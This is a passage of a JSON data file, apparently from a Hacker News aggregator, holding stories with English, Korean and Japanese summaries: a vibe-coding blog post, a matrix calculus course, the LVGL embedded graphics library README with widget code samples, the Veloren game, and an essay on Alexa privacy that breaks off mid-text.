      "ko": "루카스 페르난데스 아기아르가 \"왜 나는 바이브 코딩과 이별하는가\"라는 블로그 글에서 자신의 바이브 코딩 경험에 대해 이야기합니다. 바이브 코딩은 창의적인 흐름 속에서 코딩하는 방식으로, 종종 AI 도구의 도움을 받습니다. 처음에는 생산적인 느낌이 들어 즐겼지만, 나중에는 혼란과 비효율성을 초래한다는 것을 알게 되었습니다.\n\n바이브 코딩의 정의는 AI의 도움을 받아 코딩하는 마음가짐에 더 가깝습니다. 구조적인 계획이나 테스트를 따르기보다는 창의적인 흐름을 중시합니다. 생산적인 느낌이 들 수 있지만, 명확한 방향성이 부족합니다.\n\n두 달 동안 바이브 코딩에 의존한 결과, 아기아르는 여러 가지 문제를 경험했습니다. 화면의 오류와 기능에 방해받아 시간이 낭비되었고, AI 도구를 사용하면서 생성된 코드가 많아 나중에 많은 수정이 필요해 비용이 많이 들었습니다.\n\n다른 도구와의 비교도 있었습니다. AI 채팅은 빠른 답변과 기본 코드 작성에 유용하지만, 이해 없이 의존하게 될 위험이 있습니다. 웹 검색은 특정 솔루션을 찾는 데 유용하지만, 정보가 너무 많아 압도당할 수 있습니다. 아기아르는 제미니 코드 어시스트와 오픈 웹 UI와 같은 도구들이 더 나은 균형을 제공하며, 과도한 비용 없이 도움을 줄 수 있다고 느꼈습니다.\n\n바이브 코딩은 창의성에는 장점이 있지만, 구조적인 프로젝트에는 지속 가능하지 않다고 결론지었습니다. 아기아르는 비용 통제가 더 잘 되고 코딩 지원을 제공하는 도구를 사용하는 것이 중요하다고 강조하며, 창의성과 구조적 개발 사이의 균형을 찾는 것이 필요하다고 제안합니다.",
      "ja": "ブログ記事「なぜ私はバイブコーディングをやめるのか」で、ルーカス・フェルナンデス・アギアールは「バイブコーディング」の体験について語っています。バイブコーディングとは、クリエイティブな流れの中でコーディングを行い、AIツールを活用することを指します。最初は生産的に感じて楽しんでいましたが、後に混乱や非効率を招くことに気づきました。\n\nバイブコーディングの定義は、AIの助けを借りてコーディングする心構えに重きを置いており、構造的な計画やテストに従うことではありません。生産的に感じることもありますが、明確な方向性が欠けています。\n\nアギアールは、バイブコーディングに頼って2ヶ月後に大きな問題に直面しました。画面上のエラーや機能に気を取られ、時間を無駄にすることが多くなりました。また、AIツールを使うことで生成されたコードが多く、後で大幅な手直しが必要になり、コストもかさみました。\n\n他のツールとの比較では、AIチャットは迅速な回答や定型コードには役立ちますが、理解せずに依存する危険があります。ウェブ検索は特定の解決策には便利ですが、情報が多すぎて圧倒されることもあります。アギアールは、ジェミニコードアシストやオープンウェブUIのようなツールが、過剰なコストをかけずに支援を提供するため、より良いバランスをもたらすと感じました。\n\nバイブコーディングには創造性を引き出す利点がありますが、構造的なプロジェクトには持続可能ではありません。アギアールは、コスト管理とコーディング支援をより良く提供するツールの使用を提案し、創造性と構造的開発のバランスを見つける重要性を強調しています。"
    }
  },
  {
    "id": "7c7620eb4213ad13",
    "title": {
      "en": "Matrix Calculus (For Machine Learning and Beyond)",
      "ko": "행렬 미적분의 모든 것",
      "ja": "行列微積分の新常識"
    },
    "type": "story",
    "url": "https://arxiv.org/abs/2501.14787",
    "score": 75,
    "by": "ibobev",
    "time": 1743278433,
    "content": "This course, intended for undergraduates familiar with elementary calculus and linear algebra, introduces the extension of differential calculus to functions on more general vector spaces, such as functions that take as input a matrix and return a matrix inverse or factorization, derivatives of ODE solutions, and even stochastic derivatives of random functions. It emphasizes practical computational applications, such as large-scale optimization and machine learning, where derivatives must be re-imagined in order to be propagated through complicated calculations. The class also discusses efficiency concerns leading to \"adjoint\" or \"reverse-mode\" differentiation (a.k.a. \"backpropagation\"), and gives a gentle introduction to modern automatic differentiation (AD) techniques.",
    "summary": {
      "en": "This course is designed for undergraduate students who know basic calculus and linear algebra. It teaches how to apply differential calculus to more complex functions, like those involving matrices and their inverses, solutions to ordinary differential equations (ODEs), and random functions. The focus is on practical uses, particularly in large-scale optimization and machine learning, where derivatives need to be adapted for complex calculations. The course also covers efficient methods like \"reverse-mode\" differentiation (also known as backpropagation) and introduces modern techniques for automatic differentiation.",
      "ko": "이 과정은 기본 미적분학과 선형대수를 아는 학부 학생들을 위해 설계되었습니다. 미분 계산을 행렬과 그 역행렬, 일반 미분 방정식(ODE)의 해, 그리고 랜덤 함수와 같은 더 복잡한 함수에 적용하는 방법을 가르칩니다. 이 과정은 특히 대규모 최적화와 머신러닝에서의 실용적인 사용에 중점을 두고 있으며, 복잡한 계산을 위해 도함수를 조정하는 방법을 다룹니다. 또한 \"역전파\"로 알려진 역모드 미분과 자동 미분을 위한 현대적인 기법도 소개합니다.",
      "ja": "このコースは、基本的な微積分と線形代数を理解している学部生を対象としています。微分計算を、行列やその逆行列を含む複雑な関数、常微分方程式（ODE）の解、ランダム関数などに適用する方法を学びます。特に、大規模な最適化や機械学習における実用的な利用に焦点を当てており、複雑な計算のために導関数を適応させる必要があります。また、「逆モード」微分（バックプロパゲーションとも呼ばれる）などの効率的な手法や、自動微分の現代的な技術も紹介します。"
    }
  },
  {
    "id": "94bc8940d3eca6bf",
    "title": {
      "en": "Lvgl: Embedded graphics library to create beautiful UIs",
      "ko": "Lvgl: 아름다운 UI의 비밀",
      "ja": "美しいUIを作るLvgl"
    },
    "type": "story",
    "url": "https://github.com/lvgl/lvgl",
    "score": 77,
    "by": "tosh",
    "time": 1743273763,
    "content": "English | 中文 | Português do Brasil | 日本語\n\n Light and Versatile Graphics Library\n\nWebsite  |\nDocs |\nForum |\nDemos |\nServices\n\n📒 Overview\nMature and Well-known\nLVGL is the most popular free and open source embedded graphics library to create beautiful UIs for any MCU, MPU and display type. It's supported by industry leading vendors and projects like Arm, STM32, NXP, Espressif, Nuvoton, Arduino, RT-Thread, Zephyr, NuttX, Adafruit and many more.\nFeature Rich\nIt has all the features to create modern and beautiful GUIs: 30+ built-in widgets, a powerful style system, web inspired layout managers, and a typography system supporting many languages. To integrate LVGL into your platform, all you need is at least 32kB RAM and 128 kB Flash, a C compiler, a frame buffer, and at least an 1/10 screen sized buffer for rendering.\nServices\nOur team is ready to help you with graphics design, UI implementation and consulting services. Contact us if you need some support during the development of your next GUI project.\n🚀 Features\nFree and Portable\n\nA fully portable C (C++ compatible) library with no external dependencies.\nCan be compiled to any MCU or MPU, with any (RT)OS.\nSupports monochrome, ePaper, OLED or TFT displays, or even monitors. Displays\nDistributed under the MIT license, so you can easily use it in commercial projects too.\nNeeds only 32kB RAM and 128 kB Flash, a frame buffer, and at least an 1/10 screen sized buffer for rendering.\nOS, External memory and GPU are supported but not required.\n\nWidgets, Styles, Layouts and more\n\n30+ built-in Widgets: Button, Label, Slider, Chart, Keyboard, Meter, Arc, Table and many more.\nFlexible Style system with ~100 style properties to customize any part of the widgets in any state.\nFlexbox and Grid-like layouts engines to automatically size and position the widgets in a responsive way.\nTexts are rendered with UTF-8 encoding supporting CJK, Thai, Hindi, Arabic, Persian writing systems.\nWord wrapping, kerning, text scrolling, sub-pixel rendering, Pinyin-IME Chinese input, Emojis in texts.\nRendering engine supporting animations, anti-aliasing, opacity, smooth scrolling, shadows, image transformation, etc\nSupports Mouse, Touchpad, Keypad, Keyboard, External buttons, Encoder Input devices.\nMultiple display support.\n\nBinding and Build Support\n\nMicroPython Binding exposes LVGL API\nPikaScript Binding python on MCU lighter and easier.\nNo custom build system is used. You can build LVGL as you build the other files of your project.\nSupport for Make and CMake is included out of the box.\nDevelop on PC and use the same UI code on embedded hardware.\nConvert the C UI code to HTML file with our Emscripten port.\n\nDocs, Tools, and Services\n\nDetailed Documentation with 100+ simple examples\nServices such as User interface design, Implementation and Consulting to make UI development simpler and faster.\n\n❤️ Sponsor\nIf LVGL saved you a lot of time and money or you just had fun using it, consider Supporting its Development.\nHow do we spend the donations?\nOur goal is to provide financial compensation for people who do the most for LVGL. It means not only the maintainers but anyone who implements a great feature should get a payment from the accumulated money. We use the donations to cover our operational costs like servers and related services.\nHow to donate?\nWe use GitHub Sponsors where you can easily send one time or recurring donations. You can also see all of our expenses  in a transparent way.\nHow to get paid for your contribution?\nIf someone implements or fixes an issue labeled as Sponsored he or she will get a payment for that work. We estimate the required time, complexity and importance of the issue and set a price accordingly. To jump in just comment on a Sponsored issue saying \"Hi, I'd like to deal with it. This is how I'm planning to fix/implement it...\". A work is considered ready when it's approved and merged by a maintainer. After that you can submit and expense at opencollective.com and you will receive the payment in a few days.\nOrganizations supporting LVGL\n\nIndividuals supporting LVGL\n\n📦 Packages\nLVGL is available as:\n\nArduino library\nPlatformIO package\nZephyr library\nESP-IDF(ESP32) component\nNXP MCUXpresso component\nNuttX library\nRT-Thread RTOS\nCMSIS-Pack\nRIOT OS package\n\n🤖 Examples\nSee some examples of creating widgets, using layouts and applying styles. You will find C and MicroPython code, and links to try out or edit the examples in an online MicroPython editor.\nFor more examples check out the Examples folder.\nHello world label\n\n  C code\n/*Change the active screen's background color*/\nlv_obj_set_style_bg_color(lv_screen_active(), lv_color_hex(0x003a57), LV_PART_MAIN);\n\n/*Create a white label, set its text and align it to the center*/\nlv_obj_t * label = lv_label_create(lv_screen_active());\nlv_label_set_text(label, \"Hello world\");\nlv_obj_set_style_text_color(label, lv_color_hex(0xffffff), LV_PART_MAIN);\nlv_obj_align(label, LV_ALIGN_CENTER, 0, 0);\n\n  MicroPython code | Online Simulator\n# Change the active screen's background color\nscr = lv.screen_active()\nscr.set_style_bg_color(lv.color_hex(0x003a57), lv.PART.MAIN)\n\n# Create a white label, set its text and align it to the center\nlabel = lv.label(lv.screen_active())\nlabel.set_text(\"Hello world\")\nlabel.set_style_text_color(lv.color_hex(0xffffff), lv.PART.MAIN)\nlabel.align(lv.ALIGN.CENTER, 0, 0)\n\nButton with Click Event\n\n  C code\nlv_obj_t * button = lv_button_create(lv_screen_active());          /*Add a button to the current screen*/\nlv_obj_center(button);                           /*Set its position*/\nlv_obj_set_size(button, 100, 50);                 /*Set its size*/\nlv_obj_add_event_cb(button, button_event_cb, LV_EVENT_CLICKED, NULL); /*Assign a callback to the button*/\n\nlv_obj_t * label = lv_label_create(button);            /*Add a label to the button*/\nlv_label_set_text(label, \"Button\");               /*Set the labels text*/\nlv_obj_center(label);                      /*Align the label to the center*/\n...\n\nvoid button_event_cb(lv_event_t * e)\n{\n printf(\"Clicked\\n\");\n}\n\n  MicroPython code | Online Simulator\ndef button_event_cb(e):\n print(\"Clicked\")\n\n# Create a Button and a Label\nbutton = lv.button(lv.screen_active())\nbutton.center()\nbutton.set_size(100, 50)\nbutton.add_event_cb(button_event_cb, lv.EVENT.CLICKED, None)\n\nlabel = lv.label(button)\nlabel.set_text(\"Button\")\nlabel.center()\n\nCheckboxes with Layout\n\n  C code\nlv_obj_set_flex_flow(lv_screen_active(), LV_FLEX_FLOW_COLUMN);\nlv_obj_set_flex_align(lv_screen_active(), LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);\n\nlv_obj_t * cb;\ncb = lv_checkbox_create(lv_screen_active());\nlv_checkbox_set_text(cb, \"Apple\");\nlv_obj_add_event_cb(cb, event_handler, LV_EVENT_ALL, NULL);\n\ncb = lv_checkbox_create(lv_screen_active());\nlv_checkbox_set_text(cb, \"Banana\");\nlv_obj_add_state(cb, LV_STATE_CHECKED);\nlv_obj_add_event_cb(cb, event_handler, LV_EVENT_ALL, NULL);\n\ncb = lv_checkbox_create(lv_screen_active());\nlv_checkbox_set_text(cb, \"Lemon\");\nlv_obj_add_state(cb, LV_STATE_DISABLED);\nlv_obj_add_event_cb(cb, event_handler, LV_EVENT_ALL, NULL);\n\ncb = lv_checkbox_create(lv_screen_active());\nlv_obj_add_state(cb, LV_STATE_CHECKED | LV_STATE_DISABLED);\nlv_checkbox_set_text(cb, \"Melon\\nand a new line\");\nlv_obj_add_event_cb(cb, event_handler, LV_EVENT_ALL, NULL);\n\n  MicroPython code | Online Simulator\ndef event_handler(e):\n    code = e.get_code()\n    obj = e.get_target_obj()\n    if code == lv.EVENT.VALUE_CHANGED:\n        txt = obj.get_text()\n        if obj.get_state() & lv.STATE.CHECKED:\n            state = \"Checked\"\n        else:\n            state = \"Unchecked\"\n        print(txt + \":\" + state)\n\nlv.screen_active().set_flex_flow(lv.FLEX_FLOW.COLUMN)\nlv.screen_active().set_flex_align(lv.FLEX_ALIGN.CENTER, lv.FLEX_ALIGN.START, lv.FLEX_ALIGN.CENTER)\n\ncb = lv.checkbox(lv.screen_active())\ncb.set_text(\"Apple\")\ncb.add_event_cb(event_handler, lv.EVENT.ALL, None)\n\ncb = lv.checkbox(lv.screen_active())\ncb.set_text(\"Banana\")\ncb.add_state(lv.STATE.CHECKED)\ncb.add_event_cb(event_handler, lv.EVENT.ALL, None)\n\ncb = lv.checkbox(lv.screen_active())\ncb.set_text(\"Lemon\")\ncb.add_state(lv.STATE.DISABLED)\ncb.add_event_cb(event_handler, lv.EVENT.ALL, None)\n\ncb = lv.checkbox(lv.screen_active())\ncb.add_state(lv.STATE.CHECKED | lv.STATE.DISABLED)\ncb.set_text(\"Melon\")\ncb.add_event_cb(event_handler, lv.EVENT.ALL, None)\n\nStyling a Slider\n\n  C code\nlv_obj_t * slider = lv_slider_create(lv_screen_active());\nlv_slider_set_value(slider, 70, LV_ANIM_OFF);\nlv_obj_set_size(slider, 300, 20);\nlv_obj_center(slider);\n\n/*Add local styles to MAIN part (background rectangle)*/\nlv_obj_set_style_bg_color(slider, lv_color_hex(0x0F1215), LV_PART_MAIN);\nlv_obj_set_style_bg_opa(slider, 255, LV_PART_MAIN);\nlv_obj_set_style_border_color(slider, lv_color_hex(0x333943), LV_PART_MAIN);\nlv_obj_set_style_border_width(slider, 5, LV_PART_MAIN);\nlv_obj_set_style_pad_all(slider, 5, LV_PART_MAIN);\n\n/*Create a reusable style sheet for the INDICATOR part*/\nstatic lv_style_t style_indicator;\nlv_style_init(&style_indicator);\nlv_style_set_bg_color(&style_indicator, lv_color_hex(0x37B9F5));\nlv_style_set_bg_grad_color(&style_indicator, lv_color_hex(0x1464F0));\nlv_style_set_bg_grad_dir(&style_indicator, LV_GRAD_DIR_HOR);\nlv_style_set_shadow_color(&style_indicator, lv_color_hex(0x37B9F5));\nlv_style_set_shadow_width(&style_indicator, 15);\nlv_style_set_shadow_spread(&style_indicator, 5);\n4\n/*Add the style sheet to the slider's INDICATOR part*/\nlv_obj_add_style(slider, &style_indicator, LV_PART_INDICATOR);\n\n/*Add the same style to the KNOB part too and locally overwrite some properties*/\nlv_obj_add_style(slider, &style_indicator, LV_PART_KNOB);\n\nlv_obj_set_style_outline_color(slider, lv_color_hex(0x0096FF), LV_PART_KNOB);\nlv_obj_set_style_outline_width(slider, 3, LV_PART_KNOB);\nlv_obj_set_style_outline_pad(slider, -5, LV_PART_KNOB);\nlv_obj_set_style_shadow_spread(slider, 2, LV_PART_KNOB);\n\n  MicroPython code |\nOnline Simulator\n\n# Create a slider and add the style\nslider = lv.slider(lv.screen_active())\nslider.set_value(70, lv.ANIM.OFF)\nslider.set_size(300, 20)\nslider.center()\n\n# Add local styles to MAIN part (background rectangle)\nslider.set_style_bg_color(lv.color_hex(0x0F1215), lv.PART.MAIN)\nslider.set_style_bg_opa(255, lv.PART.MAIN)\nslider.set_style_border_color(lv.color_hex(0x333943), lv.PART.MAIN)\nslider.set_style_border_width(5, lv.PART.MAIN)\nslider.set_style_pad_all(5, lv.PART.MAIN)\n\n# Create a reusable style sheet for the INDICATOR part\nstyle_indicator = lv.style_t()\nstyle_indicator.init()\nstyle_indicator.set_bg_color(lv.color_hex(0x37B9F5))\nstyle_indicator.set_bg_grad_color(lv.color_hex(0x1464F0))\nstyle_indicator.set_bg_grad_dir(lv.GRAD_DIR.HOR)\nstyle_indicator.set_shadow_color(lv.color_hex(0x37B9F5))\nstyle_indicator.set_shadow_width(15)\nstyle_indicator.set_shadow_spread(5)\n\n# Add the style sheet to the slider's INDICATOR part\nslider.add_style(style_indicator, lv.PART.INDICATOR)\nslider.add_style(style_indicator, lv.PART.KNOB)\n\n# Add the same style to the KNOB part too and locally overwrite some properties\nslider.set_style_outline_color(lv.color_hex(0x0096FF), lv.PART.KNOB)\nslider.set_style_outline_width(3, lv.PART.KNOB)\nslider.set_style_outline_pad(-5, lv.PART.KNOB)\nslider.set_style_shadow_spread(2, lv.PART.KNOB)\n\nEnglish, Hebrew (mixed LTR-RTL) and Chinese texts\n\n  C code\nlv_obj_t * ltr_label = lv_label_create(lv_screen_active());\nlv_label_set_text(ltr_label, \"In modern terminology, a microcontroller is similar to a system on a chip (SoC).\");\nlv_obj_set_style_text_font(ltr_label, &lv_font_montserrat_16, 0);\nlv_obj_set_width(ltr_label, 310);\nlv_obj_align(ltr_label, LV_ALIGN_TOP_LEFT, 5, 5);\n\nlv_obj_t * rtl_label = lv_label_create(lv_screen_active());\nlv_label_set_text(rtl_label,\"מעבד, או בשמו המלא יחידת עיבוד מרכזית (באנגלית: CPU - Central Processing Unit).\");\nlv_obj_set_style_base_dir(rtl_label, LV_BASE_DIR_RTL, 0);\nlv_obj_set_style_text_font(rtl_label, &lv_font_dejavu_16_persian_hebrew, 0);\nlv_obj_set_width(rtl_label, 310);\nlv_obj_align(rtl_label, LV_ALIGN_LEFT_MID, 5, 0);\n\nlv_obj_t * cz_label = lv_label_create(lv_screen_active());\nlv_label_set_text(cz_label,\n                  \"嵌入式系统（Embedded System），\\n是一种嵌入机械或电气系统内部、具有专一功能和实时计算性能的计算机系统。\");\nlv_obj_set_style_text_font(cz_label, &lv_font_simsun_16_cjk, 0);\nlv_obj_set_width(cz_label, 310);\nlv_obj_align(cz_label, LV_ALIGN_BOTTOM_LEFT, 5, -5);\n\n  MicroPython code | Online Simulator\nltr_label = lv.label(lv.screen_active())\nltr_label.set_text(\"In modern terminology, a microcontroller is similar to a system on a chip (SoC).\")\nltr_label.set_style_text_font(lv.font_montserrat_16, 0);\n\nltr_label.set_width(310)\nltr_label.align(lv.ALIGN.TOP_LEFT, 5, 5)\n\nrtl_label = lv.label(lv.screen_active())\nrtl_label.set_text(\"מעבד, או בשמו המלא יחידת עיבוד מרכזית (באנגלית: CPU - Central Processing Unit).\")\nrtl_label.set_style_base_dir(lv.BASE_DIR.RTL, 0)\nrtl_label.set_style_text_font(lv.font_dejavu_16_persian_hebrew, 0)\nrtl_label.set_width(310)\nrtl_label.align(lv.ALIGN.LEFT_MID, 5, 0)\n\nfont_simsun_16_cjk = lv.font_load(\"S:../../assets/font/lv_font_simsun_16_cjk.fnt\")\n\ncz_label = lv.label(lv.screen_active())\ncz_label.set_style_text_font(font_simsun_16_cjk, 0)\ncz_label.set_text(\"嵌入式系统（Embedded System），\\n是一种嵌入机械或电气系统内部、具有专一功能和实时计算性能的计算机系统。\")\ncz_label.set_width(310)\ncz_label.align(lv.ALIGN.BOTTOM_LEFT, 5, -5)\n\n▶️ Get started\nThis list will guide you to get started with LVGL step-by-step.\nGet Familiar with LVGL\n\nCheck the Online demos to see LVGL in action (3 minutes).\nRead the Introduction page of the documentation (5 minutes).\nGet familiar with the basics on the Quick overview page (15 minutes).\n\nStart to Use LVGL\n\nSet up a Simulator (10 minutes).\nTry out some Examples.\nPort LVGL to a board. See the Porting guide or check out the ready-to-use Projects.\n\nBecome a Pro\n\nRead the Main-Modules page to get a better understanding of the library (2-3 hours)\nCheck the documentation of the Widgets to see their features and usage\n\nGet Help and Help Others\n\nIf you have questions go to the Forum\nRead the Contributing guide to see how you can help to improve LVGL (15 minutes)\n\n🤝 Services\nLVGL LLC was established to provide a solid background for LVGL library and to offer several type of services to help you in UI development. With 15+ years of experience in the user interface and graphics industry we can help you the bring your UI to the next level.\n\nGraphics design Our in-house graphics designers are experts in creating beautiful modern designs which fit to your product and the resources of your hardware.\nUI implementation We can also implement your UI based on the design you or we have created. You can be sure that we will make the most out of your hardware and LVGL. If a feature or widget is missing from LVGL, don't worry, we will implement it for you.\nConsulting and Support We can support you with consulting as well to avoid pricey and time consuming mistakes during the UI development.\nBoard certification For companies who are offering development boards, or production ready kits we do board certification which shows how board can run LVGL.\n\nCheck out our Demos as reference. For more information take look at the Services page.\nContact us and tell how we can help.\n🌟 Contributing\nLVGL is an open project and contribution is very welcome. There are many ways to contribute from simply speaking about your project, through writing examples, improving the documentation, fixing bugs or even hosting your own project under the LVGL organization.\nFor a detailed description of contribution opportunities visit the Contributing section of the documentation.\nMore than 300 people already left their fingerprint in LVGL. Be one them! See you here! 🙂\n\n... and many other.",
    "summary": {
      "en": "**LVGL Overview**\n\nLVGL (Light and Versatile Graphics Library) is a popular, free, and open-source library for creating user interfaces on embedded systems. It supports various hardware platforms and is widely used by major tech companies like Arm, STM32, and Arduino.\n\n**Key Features:**\n- **Compatibility:** Works on any microcontroller or microprocessor with minimal requirements (32kB RAM and 128kB Flash).\n- **Rich Widgets:** Offers over 30 built-in widgets (e.g., buttons, labels, sliders) and a flexible styling system.\n- **Responsive Layouts:** Includes layout managers to organize widgets automatically.\n- **Multi-language Support:** Supports text rendering in various languages, including Chinese and Arabic.\n- **Input Device Support:** Compatible with mouse, touchpads, keyboards, and more.\n\n**Development Support:**\n- LVGL can be integrated easily into projects with existing build systems like Make and CMake.\n- Documentation is comprehensive, featuring over 100 examples for learning.\n- Development services are available for UI design, implementation, and consulting.\n\n**Contribution and Sponsorship:**\n- LVGL encourages community contributions and offers payment for implemented features through sponsorship.\n- Donations are used to support the development and operational costs of the library.\n\n**Getting Started:**\n- New users can explore online demos, set up a simulator, or check out example projects to start using LVGL.\n\n**Services Offered:**\n- LVGL LLC provides graphics design, UI implementation, consulting, and board certification services to enhance user interface development.\n\nFor more information, you can visit the LVGL website or their documentation.",
      "ko": "LVGL(라이트 앤드 버서타일 그래픽스 라이브러리)는 임베디드 시스템에서 사용자 인터페이스를 만들기 위한 인기 있는 무료 오픈소스 라이브러리입니다. 이 라이브러리는 다양한 하드웨어 플랫폼을 지원하며, Arm, STM32, Arduino와 같은 주요 기술 회사들에 의해 널리 사용되고 있습니다.\n\nLVGL의 주요 특징으로는 호환성이 있습니다. 최소한의 요구 사항인 32kB RAM과 128kB Flash를 갖춘 모든 마이크로컨트롤러나 마이크로프로세서에서 작동합니다. 또한 30개 이상의 내장 위젯(버튼, 레이블, 슬라이더 등)과 유연한 스타일링 시스템을 제공하여 풍부한 위젯을 지원합니다. 자동으로 위젯을 정리할 수 있는 레이아웃 관리자를 포함하여 반응형 레이아웃을 지원합니다. 다양한 언어로 텍스트 렌더링이 가능하며, 중국어와 아랍어도 포함됩니다. 마우스, 터치패드, 키보드 등 다양한 입력 장치와 호환됩니다.\n\n개발 지원 측면에서 LVGL은 Make와 CMake와 같은 기존 빌드 시스템에 쉽게 통합될 수 있습니다. 문서화가 잘 되어 있어 학습을 위한 100개 이상의 예제가 포함되어 있습니다. UI 디자인, 구현 및 컨설팅을 위한 개발 서비스도 제공됩니다.\n\nLVGL은 커뮤니티의 기여를 장려하며, 구현된 기능에 대해 후원을 통해 보상을 제공합니다. 기부금은 라이브러리의 개발 및 운영 비용을 지원하는 데 사용됩니다.\n\n새로운 사용자는 온라인 데모를 탐색하거나 시뮬레이터를 설정하거나 예제 프로젝트를 확인하여 LVGL을 시작할 수 있습니다. LVGL LLC는 그래픽 디자인, UI 구현, 컨설팅 및 보드 인증 서비스를 제공하여 사용자 인터페이스 개발을 향상시킵니다.\n\n더 많은 정보는 LVGL 웹사이트나 문서를 방문하여 확인할 수 있습니다.",
      "ja": "LVGL（ライトで多用途なグラフィックスライブラリ）は、組み込みシステム向けのユーザーインターフェースを作成するための人気のある無料のオープンソースライブラリです。このライブラリはさまざまなハードウェアプラットフォームに対応しており、Arm、STM32、Arduinoなどの大手テクノロジー企業に広く利用されています。\n\nLVGLの主な特徴には、互換性があり、最小限の要件（32kBのRAMと128kBのフラッシュメモリ）であらゆるマイクロコントローラーやマイクロプロセッサで動作することが含まれます。また、ボタンやラベル、スライダーなど30以上の組み込みウィジェットを提供し、柔軟なスタイリングシステムも備えています。ウィジェットを自動的に整理するレイアウトマネージャーも含まれており、さまざまな言語（中国語やアラビア語を含む）でのテキストレンダリングにも対応しています。さらに、マウス、タッチパッド、キーボードなどの入力デバイスにも対応しています。\n\n開発のサポートとして、LVGLはMakeやCMakeなどの既存のビルドシステムに簡単に統合でき、100以上の学習用例を含む包括的なドキュメントが用意されています。ユーザーインターフェースのデザイン、実装、コンサルティングに関する開発サービスも提供されています。\n\nLVGLはコミュニティからの貢献を奨励しており、実装された機能に対してスポンサーシップを通じて報酬を提供しています。寄付はライブラリの開発や運営費用の支援に使用されます。\n\n新しいユーザーは、オンラインデモを探索したり、シミュレーターを設定したり、例プロジェクトをチェックしたりしてLVGLの使用を開始できます。\n\nLVGL LLCは、ユーザーインターフェースの開発を向上させるために、グラフィックデザイン、UI実装、コンサルティング、ボード認証サービスを提供しています。詳細については、LVGLのウェブサイトやドキュメントを訪れることができます。"
    }
  },
  {
    "id": "6556a279fd54506e",
    "title": {
      "en": "Veloren – voxel action-adventure role-playing",
      "ko": "벨로렌: 복셀 모험 RPG",
      "ja": "ヴェロレンの冒険"
    },
    "type": "story",
    "url": "https://veloren.net/",
    "score": 263,
    "by": "tete",
    "time": 1743271508,
    "content": "Welcome to Veloren!Veloren is an action-adventure role-playing game set in a vast fantasy world.🏕️ Explore enormous mountains, arid deserts, dense jungles, and many more environments⚔️ Discover many different weapons and play styles with dynamic and fast-paced combat🏠 Interact with NPCs and craft equipment in towns to help you on your way☠️ Encounter menacing bosses and fearsome monsters in dungeons and hideouts🌎 Experience a complex and interconnected procedural world, fully simulated as you play⛏️ Delve deep beneath the earth to mine ore and gems in sprawling cave networks🐎 Tame wild beasts as companions and mounts to aid you in your journey🫱🏽‍🫲🏿 Adventure with friends on multiplayer servers, or host your own over LAN🛠️ Discover the source code and contribute to the project yourselfWhat are you waiting for?",
    "summary": {
      "en": "Welcome to Veloren! It's an action-adventure role-playing game in a large fantasy world. \n\n- **Explore** diverse environments like mountains, deserts, and jungles.\n- **Engage** in dynamic combat with various weapons and play styles.\n- **Interact** with NPCs and craft gear in towns.\n- **Face** tough bosses and monsters in dungeons.\n- **Experience** a detailed world that changes as you play.\n- **Mine** for resources in extensive cave systems.\n- **Tame** wild animals to accompany you.\n- **Play** with friends online or on local servers.\n- **Contribute** to the project by exploring the source code.\n\nDive into the adventure!",
      "ko": "벨로렌에 오신 것을 환영합니다! 이 게임은 넓은 판타지 세계에서 펼쳐지는 액션 어드벤처 롤플레잉 게임입니다. \n\n다양한 환경을 탐험할 수 있습니다. 산, 사막, 정글 등 여러 장소를 경험해 보세요. 다양한 무기와 플레이 스타일로 역동적인 전투에 참여할 수 있습니다. 마을에서는 NPC와 상호작용하고 장비를 제작할 수 있습니다. 던전에서는 강력한 보스와 괴물에 맞서 싸워야 합니다. \n\n게임을 진행하면서 변화하는 세밀한 세계를 경험할 수 있습니다. 광범위한 동굴 시스템에서 자원을 채굴할 수 있으며, 야생 동물을 길들여 함께 모험할 수 있습니다. 친구들과 온라인 또는 로컬 서버에서 함께 플레이할 수 있습니다. 또한, 소스 코드를 탐험하며 프로젝트에 기여할 수도 있습니다. \n\n모험에 뛰어들어 보세요!",
      "ja": "Velorenへようこそ！これは広大なファンタジーの世界で繰り広げられるアクションアドベンチャーRPGです。\n\nさまざまな環境を探索できます。山や砂漠、ジャングルなど、多様な景色が広がっています。戦闘はダイナミックで、さまざまな武器やプレイスタイルを駆使して挑むことができます。町ではNPCと交流し、装備を作成することも可能です。\n\nダンジョンでは、強力なボスやモンスターと対峙します。プレイするにつれて変化する詳細な世界を体験できるのも魅力です。広大な洞窟システムでは資源を採掘することができます。野生の動物を飼いならして、一緒に冒険することもできます。\n\n友達とオンラインやローカルサーバーで一緒に遊ぶこともできます。また、ソースコードを探索することでプロジェクトに貢献することも可能です。\n\nさあ、冒険に飛び込んでみましょう！"
    }
  },
  {
    "id": "f8db0cbcb8af5b9b",
    "title": {
      "en": "The Candid Naivety of Geeks",
      "ko": "기발한 순수함",
      "ja": "オタクの純真さ"
    },
    "type": "story",
    "url": "https://ploum.net/2025-03-28-geeks-naivety.html",
    "score": 111,
    "by": "SlackingOff123",
    "time": 1743277546,
    "content": "The candid naivety of geeks\nby Ploum on 2025-03-28\nI mean, come on!\nAmazon recently announced that, from now on, everything you say to Alexa will be sent to their server.\n\nPluralistic: Amazon annihilates Alexa privacy settings, turns on continuous, nonconsensual audio uploading (15 Mar 2025) (pluralistic.net)\n\nWhat surprised me the most with this announcement is how it was met with surprise and harsh reactions. People felt betrayed.\nI mean, come on!\nDid you really think that Amazon was not listening to you before that? Did you really buy an Alexa trusting Amazon to \"protect your privacy\"?\nRecently, I came across a comment on Hacker News where the poster defended Apple as protecting privacy of its users because \"They market their product as protecting our privacy\".\nI mean, once again, come on!\nDid you really think that \"marketing\" is telling the truth? Are you a freshly debarked Thermian? (In case you missed it, this is a Galaxy Quest reference.)\nThe whole point of marketing is to lie, lie and lie again.\nWhat is the purpose of that gadget?\nThe whole point of the whole Amazon Alexa tech stack is to send information to Amazon. That’s the main goal of the thing. The fact that it is sometimes useful to you is a direct consequence of the thing sending information to Amazon. Just like Facebook linking you with friends is a consequence of you giving your information to Meta. Usefulness is only a byproduct of privacy invasion.\nHaving a fine-grained setting enabling \"do not send all information to Amazon please\" is, at best, wishful thinking. We had the same in the browser (\"do-not-track\"). It didn’t work.\nI’ve always been convinced that the tech geeks who bought an Amazon Alexa perfectly knew what they were doing. One of my friends has a Google Echo and justify it with \"Google already knows everything about our family through our phones, so I’m trading only a bit more of our privacy for convenience\". I don’t agree with him but, at the very least, it’s a logical opinion.\nWe all know that what can be done with a tool will be done eventually. And you should prepare for it. On a side note, I also postulate that the reason Amazon removed that setting is because they were already gathering too much data to justify 